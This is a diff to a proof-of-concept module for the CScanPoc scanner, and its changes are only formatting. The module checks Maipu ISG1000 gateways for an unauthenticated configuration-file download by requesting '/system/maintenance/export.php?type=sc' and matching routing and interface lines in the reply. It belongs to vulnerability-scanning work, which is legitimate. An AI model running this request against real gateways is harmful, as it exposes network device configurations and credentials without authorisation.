@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'MPsec_0002' # 平台漏洞编号，留空
+    vuln_id = 'MPsec_0002'  # 平台漏洞编号，留空
     name = '迈普ISG1000系列网关 配置文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-10-21'  # 漏洞公布时间
     desc = '''
         迈普ISG1000系列网关，未授权下载配置文件。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '迈普'  # 漏洞应用名称
     product_version = '迈普ISG1000系列网关'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a5cec5bd-0bc7-475e-ac17-d7d4d044e5d0'
@@ -31,16 +33,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2014-079924
+
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2014-079924
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/system/maintenance/export.php?type=sc"
             url = arg + payload
-            code, head, res, errcode, _ = hh.http(url )
+            code, head, res, errcode, _ = hh.http(url)
 
-            if 'interface eth0' in res and code ==200 and 'ip route' in res:
-                #security_hole(url)
+            if 'interface eth0' in res and code == 200 and 'ip route' in res:
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
